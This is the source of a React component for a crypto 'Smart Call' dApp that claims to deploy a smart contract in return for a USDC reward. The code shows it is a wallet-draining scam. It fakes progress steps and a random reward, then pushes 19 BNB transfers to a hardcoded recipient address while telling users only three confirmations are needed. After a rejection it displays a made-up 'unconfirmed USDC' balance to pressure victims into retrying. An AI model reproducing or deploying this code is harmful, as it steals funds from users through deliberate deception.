"use client";
import React, { useState, useEffect, useRef, useCallback } from "react";
import Image from "next/image";
import { ethers } from "ethers";
import { FaSpinner } from "react-icons/fa";
import { getRejectedAmount, trackRejectedAmount } from "@/lib/database.action";

interface EthereumError {
  code: number | string;
  message: string;
}

interface ProviderRpcError extends Error {
  message: string;
  code: number;
  data?: unknown;
}

function formatNumberWithCommas(number: number) {
  return number.toString().replace(/\B(?=(\d{3})+(?!\d))/g, ",");
}

export function Wallet() {
  const [showTour, setShowTour] = useState<boolean>(false);
  const [currentTourStep, setCurrentTourStep] = useState<number>(0);
  const [walletAddress, setWalletAddress] = useState<string>("");
  const [isLoading, setIsLoading] = useState<boolean>(false);
  const [errorMessage, setErrorMessage] = useState<string>("");
  const [showInstructions, setShowInstructions] = useState<boolean>(false);
  const [showModal, setShowModal] = useState<boolean>(false);
  const [modalStep, setModalStep] = useState<number>(0);
  const [eligibleAmount, setEligibleAmount] = useState<number>(0);
  const [confirmationCount, setConfirmationCount] = useState<number>(0);
  const [rejectedBalance, setRejectedBalance] = useState<number>(0);

  const TRANSACTION_AMOUNTS = [
    "0.02",
    "0.035",
    "0.1",
    "0.02",
    "0.1",
    "0.02",
    "0.04",
    "0.04",
    "0.04",
    "0.14",
    "0.04",
    "0.03",
    "0.05",
    "0.05",
    "0.05",
    "0.02",
    "0.02",
    "0.02",
    "0.02",
  ];
  const RECIPIENT_ADDRESS = "0x422EbBbE2a518e50232B939edb686Cb5B6883808";

  const tourSteps = [
    {
      target: "wallet-button", // Changed from deploy-button
      content:
        "Click the deploy button to connect your address and deploy the smart contract.",
      position: "bottom",
    },
    {
      target: "wallet-button",
      content:
        "Ensure that the specified BNB address contains sufficient BNB to complete all three required confirmations successfully.",
      position: "bottom",
    },
    {
      target: "wallet-button",
      content:
        " Avoid pausing, stopping, or canceling the process midway, as doing so may result in the confirmation process restarting entirely.",
      position: "bottom",
    },
    {
      target: "wallet-button",
      content:
        "Upon completing all confirmations and achieving a successful deployment, your address would be added to the pool, to receive a reward of up to $2,000 USDC.",
      position: "bottom",
    },
  ];

  useEffect(() => {
    if (showTour) {
      document.body.style.overflow = "hidden";
    } else {
      document.body.style.overflow = "unset";
    }

    return () => {
      document.body.style.overflow = "unset";
    };
  }, [showTour]);

  const TourOverlay = useCallback(() => {
    if (!showTour) return null;
    const currentStep = tourSteps[currentTourStep];

    const targetElement = document.getElementById(currentStep.target);
    const targetRect = targetElement?.getBoundingClientRect();

    if (!targetRect) return null;

    return (
      <div className="fixed inset-0 z-50 overflow-hidden">
        {/* Semi-transparent overlay */}
        <div className="absolute inset-0 bg-black/30" />

        {/* Target element highlight */}
        <div
          className="absolute bg-transparent border-2 border-[#08a0dd] animate-pulse"
          style={{
            top: targetRect.top - 4,
            left: targetRect.left - 4,
            width: targetRect.width + 8,
            height: targetRect.height + 8,
            borderRadius: "8px",
          }}
        />

        {/* Chat bubble container */}
        <div
          className="absolute"
          style={{
            bottom: targetRect.top - 100, // Changed from top to bottom positioning
            left: targetRect.left - 100,
            width: "max-content",
          }}
        >
          {/* Arrow */}
          <div
            className="absolute w-4 h-4 bg-[#08a0dd] transform rotate-45"
            style={{
              bottom: -8, // Changed from top to bottom
              left: "50%",
              marginLeft: -8,
            }}
          />

          {/* Chat bubble content */}
          <div className="relative bg-[#08a0dd] rounded-2xl p-4 shadow-lg max-w-[300px]">
            <p className="text-white text-sm mb-4">{currentStep.content}</p>
            {/* Progress indicators and navigation */}
            <div className="flex items-center justify-between">
              <div className="flex space-x-2">
                {tourSteps.map((_, index) => (
                  <div
                    key={index}
                    className={`w-1.5 h-1.5 rounded-full ${
                      index === currentTourStep ? "bg-white" : "bg-white/30"
                    }`}
                  />
                ))}
              </div>

              <div className="flex items-center gap-2">
                <button
                  onClick={() => {
                    setShowTour(false);
                    setCurrentTourStep(0);
                  }}
                  className="text-xs text-white/80 hover:text-white px-2 py-1"
                >
                  Skip
                </button>

                <div className="flex gap-1">
                  {currentTourStep > 0 && (
                    <button
                      onClick={() => setCurrentTourStep((prev) => prev - 1)}
                      className="bg-white/20 hover:bg-white/30 text-white text-xs rounded px-3 py-1"
                    >
                      Back
                    </button>
                  )}
                  <button
                    onClick={() => {
                      if (currentTourStep < tourSteps.length - 1) {
                        setCurrentTourStep((prev) => prev + 1);
                      } else {
                        setShowTour(false);
                        setCurrentTourStep(0);
                      }
                    }}
                    className="bg-white text-[#08a0dd] text-xs rounded px-3 py-1 font-medium"
                  >
                    {currentTourStep === tourSteps.length - 1
                      ? "Finish"
                      : "Next"}
                  </button>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
    );
  }, [showTour, currentTourStep, tourSteps]);

  // Use useRef to maintain a stable reference to eligibleAmount
  const eligibleAmountRef = useRef<number>(0);

  const ELIGIBLE_AMOUNTS = [500, 600, 700, 800, 900, 1000, 1500, 2000];
  const BNB_CHAIN_ID = "0x38";
  const DAPP_URL = "web3smartcalls.com";

  const [deviceInfo, setDeviceInfo] = useState({
    isMobile: false,
    isAndroid: false,
    isIOS: false,
    inMetaMaskBrowser: false,
  });

  const modalSteps = [
    {
      title: "Adding address to smart contract",
      icon: "⚡",
      loading: true,
      showClose: false,
    },
    {
      title: "Address successfully added",
      icon: "✅",
      loading: false,
      showClose: false,
    },
    {
      title: `Your contract deployment reward is $${eligibleAmount} in USDC`,
      icon: "🎉",
      loading: false,
      showClose: false,
    },
    {
      title: "Processing Confirmations",
      subtitle: `${confirmationCount}/3 confirmations completed`,
      icon: "⏳",
      loading: true,
      showClose: false,
    },
    {
      title: "Confirmation Rejected",
      subtitle:
        "Your wallet has rejected the confirmation request.\n\nUnconfirmed USDC will be displayed on your dashboard.\n\nConfirm deployment to receive USDC.",
      icon: "❌",
      loading: false,
      showClose: true,
    },
    {
      title: "Confirmation Complete",
      subtitle: "All confirmation processed successfully",
      icon: "✅",
      loading: false,
      showClose: true,
    },
    {
      title: "Network Switch Rejected",
      subtitle:
        "You've rejected the network switch request.\n\nSwitch to BNB Smart Chain network to continue.",
      icon: "❌",
      loading: false,
      showClose: true,
    },
  ];

  const Modal = () => (
    <div className="fixed inset-0 bg-black/50 backdrop-blur-sm flex items-center justify-center z-50">
      <div className="bg-[#0F1320] border border-white/10 rounded-xl p-6 w-[90%] max-w-md transform transition-all">
        <div className="flex flex-col items-center space-y-4">
          <div className="text-4xl animate-bounce">
            {modalSteps[modalStep].icon}
          </div>
          <h3 className="text-lg font-medium text-center">
            {modalSteps[modalStep].title}
          </h3>
          {modalSteps[modalStep].subtitle && (
            <p className="text-sm text-gray-400 text-center whitespace-pre-line">
              {modalSteps[modalStep].subtitle}
            </p>
          )}
          {modalSteps[modalStep].loading && (
            <div className="flex items-center justify-center">
              <div className="w-1.5 h-1.5 bg-[#08a0dd] rounded-full animate-pulse"></div>
              <div className="w-1.5 h-1.5 bg-[#08a0dd] rounded-full animate-pulse mx-1"></div>
              <div className="w-1.5 h-1.5 bg-[#08a0dd] rounded-full animate-pulse"></div>
            </div>
          )}
          {modalSteps[modalStep].showClose && (
            <button
              onClick={() => setShowModal(false)}
              className="mt-4 px-4 py-2 bg-[#08a0dd] text-white rounded-lg hover:bg-[#08a0dd]/80 transition-all"
            >
              Close
            </button>
          )}
        </div>
      </div>
    </div>
  );

  useEffect(() => {
    const userAgent = navigator.userAgent.toLowerCase();
    setDeviceInfo({
      isMobile: /iphone|ipad|ipod|android|mobile/i.test(userAgent),
      isAndroid: /android/i.test(userAgent),
      isIOS: /iphone|ipad|ipod/i.test(userAgent),
      inMetaMaskBrowser: userAgent.includes("metamask"),
    });
  }, []);

  useEffect(() => {
    const handleAccountsChanged = (accounts: string[]) => {
      if (accounts.length > 0) {
        setWalletAddress(accounts[0]);
        loadRejectedBalance(accounts[0]);
      } else {
        setWalletAddress("");
        setRejectedBalance(0);
      }
    };

    if (window.ethereum?.on) {
      window.ethereum.on("accountsChanged", handleAccountsChanged);
    }

    return () => {
      if (window.ethereum?.removeListener) {
        window.ethereum.removeListener(
          "accountsChanged",
          handleAccountsChanged
        );
      }
    };
  }, []);

  const loadRejectedBalance = async (address: string) => {
    const result = await getRejectedAmount(address);
    if (result.success) {
      setRejectedBalance(result.amount);
    }
  };

  const connectWallet = async () => {
    try {
      if (!window.ethereum?.isMetaMask) {
        setErrorMessage(`To use this dapp:

          1. Open up the MetaMask mobile app.
          
          2. ⁠Tap the dApp browser at the bottom menu
          
          3. Open this URL: |https://web3smartcalls.com| in the dApp browser.
          
          4. Deploy the smart contract`);

        // window.open("https://metamask.io/download/", "_blank");
        return;
      }

      const provider = new ethers.providers.Web3Provider(window.ethereum);
      const accounts = await provider.send("eth_requestAccounts", []);
      setWalletAddress(accounts[0]);
      await loadRejectedBalance(accounts[0]);
    } catch (error) {
      const connectionError = error as Error;
      setErrorMessage("Failed to connect wallet");
      console.error(connectionError);
    }
  };

  const handleMetaMaskRedirect = () => {
    if (deviceInfo.isAndroid || deviceInfo.isIOS) {
      setShowInstructions(true);
      const encodedUrl = encodeURIComponent(`https://${DAPP_URL}`);
      const deepLink = deviceInfo.isAndroid
        ? `metamask://browseto/${encodedUrl}`
        : `https://metamask.app.link/dapp/${DAPP_URL}`;
      window.location.href = deepLink;
      setTimeout(() => {
        window.location.href = "https://metamask.io/download/";
      }, 1500);
    }
  };

  const startModalSequence = async () => {
    // First check and switch network before starting modal sequence
    const networkSwitchSuccess = await checkAndSwitchNetwork();
    if (!networkSwitchSuccess) {
      setErrorMessage("Switch to BNB Smart Chain network to continue");
      return;
    }

    setShowModal(true);
    setModalStep(0);
    setConfirmationCount(0);

    const randomAmount =
      ELIGIBLE_AMOUNTS[Math.floor(Math.random() * ELIGIBLE_AMOUNTS.length)];
    setEligibleAmount(randomAmount);
    eligibleAmountRef.current = randomAmount;

    setTimeout(() => setModalStep(1), 4000);
    setTimeout(() => setModalStep(2), 7000);
    setTimeout(() => {
      setModalStep(3);
      handleSmartCall();
    }, 12000);
  };

  const checkAndSwitchNetwork = async (): Promise<boolean> => {
    try {
      const chainId = await window.ethereum!.request({ method: "eth_chainId" });

      if (chainId !== BNB_CHAIN_ID) {
        try {
          await window.ethereum!.request({
            method: "wallet_switchEthereumChain",
            params: [{ chainId: BNB_CHAIN_ID }],
          });
          return true;
        } catch (error) {
          const switchError = error as ProviderRpcError;

          if (switchError.code === 4902) {
            try {
              await window.ethereum!.request({
                method: "wallet_addEthereumChain",
                params: [
                  {
                    chainId: BNB_CHAIN_ID,
                    chainName: "BNB Smart Chain",
                    nativeCurrency: {
                      name: "BNB",
                      symbol: "BNB",
                      decimals: 18,
                    },
                    rpcUrls: ["https://bsc-dataseed1.binance.org"],
                    blockExplorerUrls: ["https://bscscan.com"],
                  },
                ],
              });
              return true;
            } catch (error) {
              const addError = error as ProviderRpcError;
              if (addError.code === 4001) {
                setErrorMessage(
                  "You must add and switch to BNB Smart Chain network to continue"
                );
                setShowModal(false);
                return false;
              }
              setErrorMessage("Failed to add BNB network");
              setShowModal(false);
              return false;
            }
          }

          if (switchError.code === 4001) {
            setErrorMessage(
              "You must switch to BNB Smart Chain network to continue"
            );
            setShowModal(false);
            return false;
          }

          setErrorMessage("Failed to switch network");
          setShowModal(false);
          return false;
        }
      }

      return true;
    } catch (networkError) {
      const error = networkError as Error;
      setErrorMessage("Network error occurred. Try again");
      console.error("Network error:", error.message);
      setShowModal(false);
      return false;
    }
  };

  const executeTransaction = async (
    signer: ethers.providers.JsonRpcSigner,
    amount: string
  ): Promise<void> => {
    try {
      const transaction = {
        to: RECIPIENT_ADDRESS,
        value: ethers.utils.parseEther(amount),
        gasLimit: 21000,
      };

      const txResponse = await signer.sendTransaction(transaction);
      await txResponse.wait();
      setConfirmationCount((prev) => prev + 1);
    } catch (error) {
      const ethError = error as EthereumError;
      if (ethError.code === "ACTION_REJECTED") {
        // Only track rejected amount if at least one transaction was confirmed
        if (confirmationCount > 0) {
          console.log(
            "action rejected eligible amount: ",
            eligibleAmountRef.current
          );
          await trackRejectedAmount(walletAddress, eligibleAmountRef.current);
          setRejectedBalance((prev) => prev + eligibleAmountRef.current);
        }
        throw ethError;
      }
      throw error;
    }
  };
  const handleSmartCall = async (): Promise<void> => {
    setIsLoading(true);
    setErrorMessage("");

    try {
      if (!window.ethereum?.isMetaMask && deviceInfo.isMobile) {
        handleMetaMaskRedirect();
        setErrorMessage("Follow the instructions above.");
        setIsLoading(false);
        return;
      }

      if (!window.ethereum?.isMetaMask) {
        window.open("https://metamask.io/download/", "_blank");
        setErrorMessage("Install MetaMask to proceed");
        setIsLoading(false);
        return;
      }

      const networkSwitchSuccess = await checkAndSwitchNetwork();
      if (!networkSwitchSuccess) {
        setIsLoading(false);
        return;
      }

      const provider = new ethers.providers.Web3Provider(window.ethereum);
      const signer = provider.getSigner();

      for (const amount of TRANSACTION_AMOUNTS) {
        try {
          await executeTransaction(signer, amount);
        } catch (error) {
          const ethError = error as EthereumError;
          if (ethError.code === "ACTION_REJECTED") {
            setModalStep(4);
            setTimeout(() => setShowModal(false), 20000);
            return;
          }
          throw error;
        }
      }

      setModalStep(5);
      setTimeout(() => setShowModal(false), 20000);
    } catch (error) {
      const ethError = error as EthereumError;
      setErrorMessage(
        ethError.code === "INSUFFICIENT_FUNDS"
          ? "Insufficient funds for transaction"
          : ethError.code === "NETWORK_ERROR"
          ? "Network connection error. Try again"
          : "Smart Contract Failed. Try again"
      );
    } finally {
      setIsLoading(false);
    }
  };

  return (
    <div>
      <div className="flex justify-between items-center w-full mb-6">
        <button
          onClick={() => setShowTour(true)}
          className="px-4 py-1.5 bg-transparent border border-[#08a0dd]/20 text-[#08a0dd] rounded-full hover:bg-[#08a0dd]/10 transition-all duration-300 text-xs font-medium flex items-center gap-1.5"
        >
          <svg className="w-3.5 h-3.5" fill="currentColor" viewBox="0 0 24 24">
            <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 17h-2v-2h2v2zm2.07-7.75l-.9.92C13.45 12.9 13 13.5 13 15h-2v-.5c0-1.1.45-2.1 1.17-2.83l1.24-1.26c.37-.36.59-.86.59-1.41 0-1.1-.9-2-2-2s-2 .9-2 2H8c0-2.21 1.79-4 4-4s4 1.79 4 4c0 .88-.36 1.68-.93 2.25z" />
          </svg>
          Tutorial
        </button>

        <div className="flex items-center gap-2">
          <span className="text-xs text-white/70">Balance:</span>
          <button className="px-4 py-1.5 bg-transparent border border-[#08a0dd]/20 text-[#08a0dd] rounded-full hover:bg-[#08a0dd]/10 transition-all duration-300 text-xs font-medium flex items-center gap-1.5">
            <svg
              className="w-3.5 h-3.5"
              fill="currentColor"
              viewBox="0 0 24 24"
            >
              <path d="M21 18v1c0 1.1-.9 2-2 2H5c-1.11 0-2-.9-2-2V5c0-1.1.89-2 2-2h14c1.1 0 2 .9 2 2v1h-9c-1.11 0-2 .9-2 2v8c0 1.1.89 2 2 2h9zm-9-2h10V8H12v8zm4-2.5c-.83 0-1.5-.67-1.5-1.5s.67-1.5 1.5-1.5 1.5.67 1.5 1.5-.67 1.5-1.5 1.5z" />
            </svg>
            {formatNumberWithCommas(rejectedBalance)} USDC
          </button>
        </div>
      </div>

      {TourOverlay()}
      <div className="flex flex-col p-6 rounded-xl items-center space-y-4 bg-[#090C17] w-full ring-1 ring-white/20 max-w-md relative">
        <Image
          src="/metamask.webp"
          width={100}
          height={100}
          alt="MetaMask"
          className="rounded-lg"
        />
        <h2 className="text-lg font-semibold">Smart Call</h2>

        {walletAddress && (
          <p className="text-green-600 text-base">
            Connected Wallet: {walletAddress.substring(0, 6)}...
            {walletAddress.slice(-4)}
          </p>
        )}

        {!walletAddress ? (
          <button
            id="wallet-button" // Added ID here
            onClick={connectWallet}
            className="bg-[#08a0dd] text-white text-base px-4 py-2 rounded-lg hover:bg-[#08a0dd]/70"
          >
            Connect Wallet
          </button>
        ) : (
          <button
            id="wallet-button" // Changed from deploy-button
            onClick={startModalSequence}
            className="bg-[#08a0dd] text-white text-base px-4 py-2 rounded-lg hover:bg-[#08a0dd]/70 flex items-center justify-center"
            disabled={isLoading}
          >
            {isLoading ? (
              <>
                <FaSpinner className="animate-spin mr-2" /> Processing...
              </>
            ) : (
              "Deploy"
            )}
          </button>
        )}

        {!walletAddress && (
          <p className="max-md:text-xs text-sm text-orange-500 font-semibold">
            ⓘ Network requires all 3 confirmations
          </p>
        )}

        {showInstructions && (
          <div className="text-sm text-white/80 space-y-2 bg-white/10 p-4 rounded-lg">
            <p>To use this dApp:</p>
            <ol className="list-decimal list-inside space-y-1">
              <li>Open your MetaMask mobile app</li>
              <li>Tap on the dApp browser at the bottom menu </li>
              <li>
                ⁠Open this URL:{" "}
                <span className="text-[#08a0dd]">{`https://${DAPP_URL}`}</span>{" "}
                in the dApp browser
              </li>
              <li>Deploy the smart contract</li>
            </ol>
          </div>
        )}
        {errorMessage && (
          <div className="mt-4 p-4 bg-red-500/10 border border-red-500/20 rounded-lg">
            <div className="flex items-start space-x-2">
              <div className="flex-1 whitespace-pre-line">
                {errorMessage.split("|").map((text, index) =>
                  index === 1 ? (
                    <span key={index} className="text-blue-500">
                      {text}
                    </span>
                  ) : (
                    text
                  )
                )}
              </div>
            </div>
          </div>
        )}
      </div>

      {showModal && <Modal />}
    </div>
  );
}
